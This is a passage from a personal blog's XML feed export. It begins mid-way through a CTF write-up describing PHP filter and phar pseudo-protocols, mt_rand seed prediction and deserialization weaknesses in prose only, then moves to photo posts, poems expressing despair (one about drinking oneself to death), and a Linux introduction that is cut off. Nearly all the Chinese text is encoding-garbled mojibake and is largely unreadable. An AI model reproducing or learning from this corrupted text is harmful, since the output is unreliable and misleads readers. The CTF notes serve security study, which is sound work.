id="PHP-Filterä¼ªåè®®"><a href="#PHP-Filterä¼ªåè®®" class="headerlink" title="PHP Filterä¼ªåè®®"></a>PHP Filterä¼ªåè®®</h4><p><code>php://filter</code>æ˜¯<code>php</code>ä¸­ç‹¬æœ‰çš„ä¸€ç§åè®®ï¼Œå®ƒæ˜¯ä¸€ç§è¿‡æ»¤å™¨ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥è¿‡æ»¤å…¶ä»–çš„æ•°æ®æµã€‚é€šå¸¸ä½¿ç”¨è¯¥åè®®æ¥è¯»å–æˆ–è€…å†™å…¥éƒ¨åˆ†æ•°æ®ï¼Œä¸”åœ¨<strong>è¯»å–å’Œå†™å…¥</strong>ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œä¸€äº›<strong>è¿‡æ»¤</strong>ï¼Œä¾‹å¦‚<code>base64</code>ç¼–ç å¤„ç†ï¼Œ<code>rot13</code>å¤„ç†ç­‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602132307452-8926922491.png"></p><p>ä¼ªåè®®å°æ€»ç»“ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602133612437-163441181.png"></p><p>ï¼ˆåé¢å†æ¥ç»†è¯´ï¼‰</p><h4 id="ä¼ªéšæœºæ•°"><a href="#ä¼ªéšæœºæ•°" class="headerlink" title="ä¼ªéšæœºæ•°"></a>ä¼ªéšæœºæ•°</h4><p>mt_srand()å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â mt_srand() å‡½æ•°æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ã€‚</span><br><span class="line">Â æç¤ºï¼šä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•°ã€‚å½“ä¸ä½¿ç”¨éšæœºæ•°æ’­ç§å‡½æ•°srandæ—¶ï¼Œphpä¹Ÿä¼šè‡ªåŠ¨ä¸ºéšæœºæ•°æ’­ç§ï¼Œå› æ­¤æ˜¯å¦ç¡®å®šç§å­éƒ½ä¸ä¼šå½±å“æ­£å¸¸è¿è¡Œã€‚</span><br></pre></td></tr></table></figure><p>åœ¨phpä¸­æ¯ä¸€æ¬¡è°ƒç”¨mt_rand()å‡½æ•°ï¼Œéƒ½ä¼šæ£€æŸ¥ä¸€ä¸‹ç³»ç»Ÿæœ‰æ²¡æœ‰æ’­ç§ã€‚ï¼ˆæ’­ç§ä¸ºmt_srand()å‡½æ•°å®Œæˆï¼‰ï¼Œå½“éšæœºç§å­ç”Ÿæˆåï¼Œåé¢ç”Ÿæˆçš„éšæœºæ•°éƒ½ä¼šæ ¹æ®è¿™ä¸ªéšæœºç§å­ç”Ÿæˆã€‚æ‰€ä»¥åŒä¸€ä¸ªç§å­ä¸‹ï¼Œéšæœºæ•°çš„åºåˆ—æ˜¯ç›¸åŒçš„ï¼Œè¿™å°±æ˜¯æ¼æ´ç‚¹ã€‚</p><p>mt_rand()çš„ç”Ÿæˆçš„éšæœºæ•°åªè·Ÿ<strong>seed</strong>å’Œ<strong>è°ƒç”¨è¯¥å‡½æ•°çš„æ¬¡æ•°</strong>æœ‰å…³</p><p>åªéœ€è¦çŸ¥é“ä¸€ä¸ªéšæœºæ•°ï¼Œå°±å¯ä»¥åˆ©ç”¨å·¥å…·åæ¨å‡ºå¯èƒ½çš„ç§å­ï¼ŒçŸ¥é“ç§å­ï¼Œéšæœºæ•°å°±ä¸ç®—éšæœºæ•°äº†ã€‚</p><p>æœ¬é¢˜é€šè¿‡ç¬¬ä¸€ä¸ªéšæœºæ•°çŒœæµ‹å‡ºseedï¼Œå†ç®—ç¬¬114514æ¬¡çš„ï¼Œå®Œå·¥ã€‚</p><h2 id="Mid-Best-Language"><a href="#Mid-Best-Language" class="headerlink" title="[Mid] Best Language"></a>[Mid] Best Language</h2><h3 id="PHPä»£ç å®¡è®¡"><a href="#PHPä»£ç å®¡è®¡" class="headerlink" title="PHPä»£ç å®¡è®¡"></a>PHPä»£ç å®¡è®¡</h3><h4 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h4><h5 id="ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ"></a>ä¸ºä»€ä¹ˆååºåˆ—åŒ–ï¼Ÿ</h5><p><strong>1.å­˜å‚¨éœ€æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â  â€œæ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚â€</span><br><span class="line">Â åœ¨ç¨‹åºæ‰§è¡Œç»“æŸæ—¶ï¼Œå†…å­˜æ•°æ®ä¾¿ä¼šç«‹å³é”€æ¯ï¼Œå˜é‡æ‰€å‚¨å­˜çš„æ•°æ®ä¾¿æ˜¯å†…å­˜æ•°æ®ï¼Œè€Œæ–‡ä»¶ã€æ•°æ®åº“æ˜¯â€œæŒä¹…æ•°æ®â€ï¼Œå› æ­¤PHPåºåˆ—åŒ–å°±æ˜¯å°†å†…å­˜çš„å˜é‡æ•°æ®â€œä¿å­˜â€åˆ°æ–‡ä»¶ä¸­çš„æŒä¹…æ•°æ®çš„è¿‡ç¨‹ã€‚</span><br></pre></td></tr></table></figure><p><strong>2.ä¼ è¾“éœ€æ±‚</strong></p><p>åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯<strong>æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²</strong>ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä¸çŸ¥é“å¤§å®¶çŸ¥ä¸çŸ¥é“jsonæ ¼å¼ï¼Œè¿™å°±æ˜¯ä¸€ç§åºåˆ—åŒ–ï¼Œæœ‰å¯èƒ½å°±æ˜¯é€šè¿‡arrayåºåˆ—åŒ–è€Œæ¥çš„ã€‚è€Œååºåˆ—åŒ–å°±æ˜¯æŠŠé‚£ä¸²å¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²å†å˜å›å¯¹è±¡ã€‚</p><p>è¿™æ ·å°±è®©å¯¹è±¡èƒ½å¤Ÿä»¥<strong>å­—èŠ‚æµ</strong>çš„å½¢å¼ä¼ è¾“ã€‚</p><h5 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221022110413532-1024x394.png"></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§<strong>æ‰“åŒ…æ–‡ä»¶</strong>ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œé‚£ä¹ˆPharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä½ ä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚</p><p>PHARæ–‡ä»¶ç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼Œä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„é…ç½®ã€‚éƒ¨ç½²éå¸¸æ–¹ä¾¿ã€‚å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹ <code>php.ini</code></p><p>æ‰“å¼€ <code>php.ini</code>ï¼Œæ‰¾åˆ° <code>phar.readonly</code> æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â phar.readonly = 0</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¥æŠŠPHPåº”ç”¨æ‰“åŒ…æˆPharæ–‡ä»¶äº†ã€‚</p><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p><p>PHARæ–‡ä»¶æ˜¯ä¸€ç§<strong>æ‰“åŒ…æ ¼å¼</strong>ï¼Œé€šè¿‡å°†å¤šæ•°PHPæ–‡ä»¶å’Œå…¶ä»–èµ„æºï¼ˆå¦‚å›¾åƒï¼‰æ†ç»‘åˆ°ä¸€ä¸ªå½’æ¡£æ–‡ä»¶ä¸­æ¥å®ç°åº”ç”¨ç¨‹åºå’Œåº“çš„åˆ†å‘ã€‚ä¸”æ‰€æœ‰PHARæ–‡ä»¶éƒ½ä½¿ç”¨.pharä½œä¸ºæ–‡ä»¶æ‰©å±•åï¼ŒPHARæ ¼å¼çš„å½’æ¡£éœ€è¦ä½¿ç”¨è‡ªå·±å†™çš„phpä»£ç ã€‚</p><p>PHARå­˜æ¡£æœ€æœ‰ç‰¹è‰²çš„ä¸€ç§æ–¹ä¾¿çš„æ–¹æ³•æ˜¯å°†å¤šä¸ªæ–‡ä»¶åˆ†ç»„ä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚è¿™æ ·ï¼ŒPHARå­˜æ¡£æä¾›äº†ä¸€ç§<strong>å°†å®Œæ•´çš„phpåº”ç”¨ç¨‹åºåˆ†å‘åˆ°å•ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶è¿è¡Œ</strong>å®ƒçš„æ–¹æ³•ï¼Œè€Œæ— éœ€å°†å…¶æå–åˆ°ç£ç›˜ã€‚</p><p>PHPå¯ä»¥åƒåœ¨å‘½ä»¤è¡Œä¸Šå’Œä»WebæœåŠ¡å™¨ä¸Šçš„ä»»ä½•å…¶ä»–æ–‡ä»¶ä¸€æ ·è½»æ¾åœ°æ‰§è¡ŒPHARå­˜æ¡£ã€‚</p><h4 id="pharä¼ªåè®®"><a href="#pharä¼ªåè®®" class="headerlink" title="pharä¼ªåè®®"></a>pharä¼ªåè®®</h4><p><strong>PHAR:&#x2F;&#x2F;åè®®</strong></p><p>å¯ä»¥å°†å¤šä¸ªæ–‡ä»¶å½’å…¥ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶å¤¹ï¼Œä¹Ÿå¯ä»¥åŒ…å«ä¸€ä¸ªæ–‡ä»¶</p><p><strong>åˆ©ç”¨å‡½æ•°</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20200415221922550.png"></p><p><strong>å§¿åŠ¿1:ç»•è¿‡ä¸Šä¼ é™åˆ¶</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â 1.ä½¿ç”¨Phar://ä¼ªåè®®æµå¯ä»¥ç»•è¿‡ä¸€äº›ä¸Šä¼ é™åˆ¶ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹å’Œæ–‡ä»¶åŒ…å«ä¸€èµ·ä½¿ç”¨</span><br></pre></td></tr></table></figure><h4 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h4><p><strong>å§¿åŠ¿2:[ååºåˆ—åŒ–]æ¼æ´</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â # æ¼æ´è§¦å‘</span><br><span class="line">Â åˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶</span><br><span class="line">Â ä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ã€‚ æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çƒ§</title>
      <link href="/2023/05/14/%E7%83%A7/"/>
      <url>/2023/05/14/%E7%83%A7/</url>
      
        <content type="html"><![CDATA[<hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/%E7%81%AB%E5%B1%B1.jpg" alt="ç«å±±" style="zoom:7%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/990F3B52A7945B34101DDCBABC0794E3.jpg" alt="990F3B52A7945B34101DDCBABC0794E3" style="zoom:43%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/%E5%86%B0%E5%B1%B1.jpg" alt="å†°å±±" style="zoom:6%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/9799F67A2E383B01F996CD79873E77EA.jpg" alt="9799F67A2E383B01F996CD79873E77EA" style="zoom:33%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> æ‘„å½± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‘„å½± </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™½å¤œè¡Œ</title>
      <link href="/2023/05/14/%E7%99%BD%E5%A4%9C%E8%A1%8C/"/>
      <url>/2023/05/14/%E7%99%BD%E5%A4%9C%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230817031722396.png" alt="image-20230817031719245" style="zoom: 33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/IMG_20230310_220851-1024x934.jpg" alt="img" style="zoom: 40%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/QQ%E5%9B%BE%E7%89%8720240116170104.jpg" alt="QQå›¾ç‰‡20240116170104" style="zoom:40%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/EC95DEEB017C955E761EF5FE0BC8606B.jpg" alt="EC95DEEB017C955E761EF5FE0BC8606B" style="zoom: 30%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> æ‘„å½± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‘„å½± </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aspyxia--çŸ­è¯—é›†</title>
      <link href="/2023/05/14/aspyxia-%E7%9F%AD%E8%AF%97%E9%9B%86/"/>
      <url>/2023/05/14/aspyxia-%E7%9F%AD%E8%AF%97%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æˆ‘æ¢¦åˆ°ä½ å‘æˆ‘èµ°æ¥ï¼Œ<br>çƒ­çƒˆçš„ç›®å…‰ç‚¹ç‡ƒäº†åœ°ç‹±çš„ç«<br>æˆ‘åªæ˜¯ä¸€åŠ¨ä¸åŠ¨çš„<br>æ³¨è§†ä½ èº«åçš„é»‘æ½­ã€‚</p></blockquote><blockquote><p>å·´åº“æ–¯çš„é…’å®´ä¸€åˆ»æœªåœæ­¢ï¼Œ<br>è¥¿è¥¿å¼—çš„å·¨çŸ³å´å·²æ— æ³•å‰è¿›ã€‚<br>å½“ä¸–ç•Œé‡å›å†·å†°ï¼Œ<br>ä½ çªç„¶æƒ³èµ·æœ€åˆçš„ç›®çš„ï¼Œ<br>å¹¶ä¸æ˜¯è¦é€ƒé¿ä¸å¹¸ã€‚</p></blockquote><blockquote><p>çˆ±è€…å’Œè¢«çˆ±è€…ä¸€åŒæ‰è¿›æ¼©æ¶¡ï¼Œ<br>æ‰€æœ‰ç–¯ç‹‚çš„å¶ç„¶ä¼´éšé£“é£<br>å°†æ¯ä¸€ä¸ªç”Ÿæ´»åœ¨åœ°ä¸Šçš„äººå¹èµ·ï¼Œ<br>å¹åˆ°ä¸€ä¸ªæ··ä¹±çš„åœ°æ–¹ï¼Œ<br>ä¸€ä¸ªè®©äººç›¸ä¿¡å½¼å²¸ä¸ºçœŸçš„åœ°æ–¹ã€‚<br>æ™ºè€…ä¸å…¥çˆ±æ²³ï¼Œ<br>æ™ºè€…è§†çˆ±æ¬²ä¸ºè‰ºæœ¯ã€‚</p><p>ä¸€ä¸ªå……æ»¡ä¼¤ç—›ä¸æ¿€æƒ…çš„ä¸–ç•Œ<br>ä¸€ä¸ªçˆ±æ¬²çš„ä¸–ç•Œ<br>æ‰æ˜¯çœŸå®çš„ä¸–ç•Œ</p><p>202302214</p></blockquote><blockquote><p>ä»–çš„åŒè„šä¸æ›¾è¸ä¸Šè¿‡å¹³åŸ<br>è¦ä¹ˆä¸‡ä¸ˆæ·±æ¸Š<br>è¦ä¹ˆæ‚¬å´–å³­å£</p><p>æ€»ä¹‹ï¼Œä»–æ‹’ç»ä¸€åˆ‡çš„ç™½ç‚½ä¸å¹³ç”°<br>ä»–è¦çš„æ˜¯ç”µé—ªé›·é¸£<br>ä»–æ¸´æœ›çœ‹è§çš„æ˜¯ç»å¢ƒæ±‚ç”Ÿ</p><p>è™½è¯´æ³›çˆ±ä¸‡ç‰©<br>å´å”¯ç‹¬æ‹’ç»äº†å¹³åº¸ä¸è½ä¿—</p></blockquote><blockquote><p>åœ¨ç™½ç‚½çš„é»‘å¤œé‡Œï¼Œå¿ƒè„æåŠ¨å’Œèƒƒæ¶²ç¿»æ»šçš„å£°éŸ³äº¤ç»‡åœ¨ä¸€èµ·ï¼Œæˆ‘çš„èº«ä½“å·²ç„¶æ˜¯ä¸€åº§è¡Œèµ°çš„å¢“ç¢‘</p></blockquote><blockquote><p>é‚£ä¸ªæ—¶å€™çƒ¤è‚ ä¸€å—äº”,çç å¥¶èŒ¶ä¸¤å—é’±ä¸€æ¯ã€‚ä¸€ä¸ªé˜´å¤©ï¼Œæˆ‘ååœ¨å¤–é¢çš„å°æ¿å‡³ä¸Šï¼Œç©¿çš„è£™å­ã€‚å¥¶èŒ¶åº—ä¸Šé¢ç™½è‰²çš„æ£šå­ï¼Œå„ç§å‘³é“çš„å¥¶èŒ¶ç²‰ç›’å­ï¼Œèˆ€å†°ç²‰çš„å‹ºå­å¾ˆåŠ£è´¨ï¼Œä¼šå¾ˆè½»æ˜“æŠŠå˜´å”‡åˆ’ç ï¼Œåœ°ä¸Šæ˜¯å¾ˆå°å¾ˆå·¥æ•´çš„è“ç™½ç›¸é—´çš„åœ°ç –ï¼Œå‘¨å›´å¾ˆç©ºæ—·ï¼Œå¾ˆå†·â€¦â€¦æ‹¼äº†å‘½æƒ³è¦æŠ“ä½çš„å›å¿†ï¼Œè¿˜æ˜¯ä¸åœæºœèµ°ã€‚æ¨è‡ªå·±çš„è„‘è¢‹ä¸èƒ½è£…ä¸‹å…¨éƒ¨<br><code>20230416</code></p></blockquote><blockquote><p>å¹²è„†ç›´æ¥å–é…’å–æ­»ç®—æ±‚äº†<br>å¤§æŠŠå¤§æŠŠçš„é’ç¥¨<br>çº¢è‰²ç»¿è‰²<br>æŠ“èµ·æ¥åˆé£èµ°<br>è™½ç„¶ä¸€æ— æ‰€æœ‰ä½†æ˜¯è¿˜çˆ±ç€åˆå¤œçš„å‰ä»–å’Œæ¥¼ä¸‹çš„å°çŒ«å’ª<br>ç„¶åä¸€è¾¹è¯´ç€è¦è¯»ç‚¹åè‘—ä¸€è¾¹å†™èµ·äº†æ˜å¤©çš„å­¦ä¹ è®¡åˆ’<br>æ—¥è®°ï¼Œæ—¥è®°æ—©å°±è¢«å¿˜äº†å‡ ç™¾å¹´<br>èº«ä½“ï¼Œ<br>è¶è‡ªå·±çƒ‚é†‰å¦‚æ³¥<br>æŠŠç³Ÿç³•é€çš„è‡ªå·±äº¤ä»˜ç»™éšä¾¿å“ªä¸ªäºº<br>èº«ä½“ä¸¢åˆ°å“ªé‡Œéƒ½æ— æ‰€è°“<br>ä»–è¯´é«˜æç”Ÿæ´èº«è‡ªå¥½<br>åˆå¥½åˆå¥½<br><code>20230428</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> è¯— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å½“ç—›è‹¦å¤§äºç—›è‹¦æœ¬èº«çš„æ—¶å€™</title>
      <link href="/2023/05/14/%E5%BD%93%E7%97%9B%E8%8B%A6%E5%A4%A7%E4%BA%8E%E7%97%9B%E8%8B%A6%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%97%B6%E5%80%99/"/>
      <url>/2023/05/14/%E5%BD%93%E7%97%9B%E8%8B%A6%E5%A4%A7%E4%BA%8E%E7%97%9B%E8%8B%A6%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%97%B6%E5%80%99/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™äºé«˜ä¸‰çš„æŸä¸ªæ·±å¤œ</p></blockquote><blockquote><p>â‘ â€”â€”æˆ‘è¢«å›°åœ¨å±±ä¸­ï¼Œå¯»æ‰¾ç€å‡ºå±±çš„è·¯ã€‚<br>è¶Šæ˜¯å‘ä¸Šæ”€çˆ¬ï¼Œè¶Šæ˜¯æ¸…æ™°çš„çœ‹è§æœéœã€‚<br>ä¹Ÿè®¸ï¼Œé‚£ä¾¿æ˜¯å®¶çš„æ–¹å‘ã€‚<br>â€”â€”ä»€ä¹ˆæ—¶å€™å¼€å§‹ï¼Œé‚£æ¥è‡ªè¿œå¤©çš„å¤ªé˜³ä¹‹å…‰ï¼Œ<br>ç«Ÿä¹Ÿæˆäº†ä½ å”¯ä¸€çš„å¸Œæœ›ï¼</p><p>â‘¡æˆ‘ç¦»é‚£é“é—¨è¶Šæ¥è¶Šè¿œäº†ï¼Œ<br>ä¸æ˜¯é—¨é‡Œçš„æ™¯è‰²ä¸å†è¿·äººï¼Œ<br>åªæ˜¯ï¼Œä»–ä»¬éƒ½æ¨ç€æˆ‘ï¼Œ<br>ä¸€åŒå‘å±±é¡¶è¿›å‡»ã€‚<br>æˆ‘å‘¢ï¼Œæˆ‘çš„æ²‰é»˜è¿˜ä¸èƒ½è¯´æ˜ä»€ä¹ˆå—ï¼Ÿ<br>é—¨è¿˜æ²¡æœ‰å…³é—­ï¼Œ<br>æˆ‘çš„çœ¼é‡Œå´å…ˆè’™ä¸Šäº†æ²™ã€‚</p><p>â‘¢æœ‰æ—¶å€™ï¼Œæˆ‘ä¹Ÿä¼šå¿˜è®°ã€‚<br>å¿˜è®°å†¬å¤©çš„é±¼ä¹Ÿä¼šå‘¼å¸ï¼Œ<br>å¿˜è®°æ°´ä¸­çš„çš“æœˆæ˜¯ä¸ªå¥‡è¿¹ï¼Œ<br>å¿˜è®°ä¿¯ä¸‹èº«ï¼Œå¬ä¸€å¬èš‚èšçš„å’†å“®ã€‚<br>é¢å¯¹ç†Šç†Šçš„ç”Ÿå‘½ä¹‹ç«ï¼Œ<br>æˆ‘åªæ˜¯ä¹‰æ— åé¡¾åœ°è·³è¿›å»ï¼Œ<br>å´è¿˜æ¸´æœ›ç”Ÿå‡ºç¾ä¸½çš„ç«èŠ±ã€‚</p><p>â‘£åƒæ˜¯é¢„è°‹è®¸ä¹…çš„ï¼Œ<br>æˆ‘åš·é“ï¼šâ€œé£å°†æˆ‘çš„å¿ƒå¹å†·äº†ï¼Œ<br>       æˆ‘å¦‚ä½•èƒ½ä½¿å®ƒæ¸©æš–ï¼â€</p><p>(ä¸)â‘¤æˆ‘ä»¥ä¸ºï¼Œæˆ‘å¬è§äº†å¤§æ¥¼å€’å¡Œçš„å£°éŸ³ã€‚<br>   æˆ‘ä»¥ä¸ºæˆ‘å³å°†æ— å®¶å¯å½’ã€‚<br>   å¯æˆ‘åˆ†æ˜è¿˜é™ååœ¨è¿™é‡Œï¼Œ<br>   åƒå…¶ä»–æ‰€æœ‰äººä¸€æ ·ï¼Œ<br>   ç™¾æ— èŠèµ–åœ°ç­‰ç€æ—¥å‡ºã€‚<br>   å¯ç©¶ç«Ÿæ˜¯å“ªé‡Œçš„å¤§æ¥¼å€’äº†ï¼Œ<br>   æˆ‘ç«Ÿè¿™æ ·åœ°æ— åŠ¨äºè¡·ï¼</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> è¯— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux</title>
      <link href="/2023/05/14/linux/"/>
      <url>/2023/05/14/linux/</url>
      
        <content type="html"><![CDATA[<h2 id="linuxä»‹ç»"><a href="#linuxä»‹ç»" class="headerlink" title="linuxä»‹ç»"></a>linuxä»‹ç»</h2><p>Linuxï¼Œå…¨ç§°GNU&#x2F;Linuxï¼Œæ˜¯ä¸€ç§<strong>å…è´¹</strong>ä½¿ç”¨å’Œè‡ªç”±ä¼ æ’­çš„<strong>ç±»UNIXæ“ä½œç³»ç»Ÿ</strong>ï¼Œå…¶å†…æ ¸ç”±æ—çº³æ–¯Â·æœ¬çº³ç¬¬å…‹ç‰¹Â·æ‰˜ç“¦å…¹äº1991å¹´10æœˆ5æ—¥é¦–æ¬¡å‘å¸ƒï¼Œå®ƒä¸»è¦å—åˆ°Minixå’ŒUnixæ€æƒ³çš„å¯å‘ï¼Œæ˜¯ä¸€ä¸ªåŸºäºPOSIXçš„å¤šç”¨æˆ·ã€å¤šä»»åŠ¡ã€æ”¯æŒå¤šçº¿ç¨‹å’Œå¤šCPUçš„æ“ä½œç³»ç»Ÿã€‚å®ƒèƒ½è¿è¡Œä¸»è¦çš„Unixå·¥å…·è½¯ä»¶ã€åº”ç”¨ç¨‹åºå’Œç½‘ç»œåè®®ã€‚å®ƒæ”¯æŒ32ä½å’Œ64ä½ç¡¬ä»¶ã€‚Linuxç»§æ‰¿äº†Unixä»¥ç½‘ç»œä¸ºæ ¸å¿ƒçš„è®¾è®¡æ€æƒ³ï¼Œæ˜¯ä¸€ä¸ªæ€§èƒ½ç¨³å®šçš„å¤šç”¨æˆ·ç½‘ç»œæ“ä½œç³»ç»Ÿã€‚Linuxæœ‰ä¸Šç™¾ç§ä¸åŒçš„å‘è¡Œç‰ˆï¼Œå¦‚åŸºäºç¤¾åŒºå¼€å‘çš„debianã€archlinuxï¼Œå’ŒåŸºäºå•†ä¸šå¼€å‘çš„Red Hat Enterprise Linuxã€SUSEã€Oracle Linuxç­‰ã€‚</p><p>ä¸»è¦ç”¨äºæœåŠ¡å™¨ç«¯ï¼ŒåµŒå…¥å¼å¼€å‘ï¼ˆå ç”¨å†…å­˜å°‘ï¼‰</p><h2 id="æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„"><a href="#æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„"></a>æ–‡ä»¶ç³»ç»Ÿçš„å±‚æ¬¡ç»“æ„</h2><p>æ–‡ä»¶ç³»ç»Ÿçš„æœ€é¡¶å±‚æ˜¯ç”±æ ¹ç›®å½•å¼€å§‹çš„ï¼Œç³»ç»Ÿä½¿ç”¨â€œ**&#x2F;<strong>â€æ¥è¡¨ç¤º</strong>æ ¹ç›®å½•**ï¼Œåœ¨æ 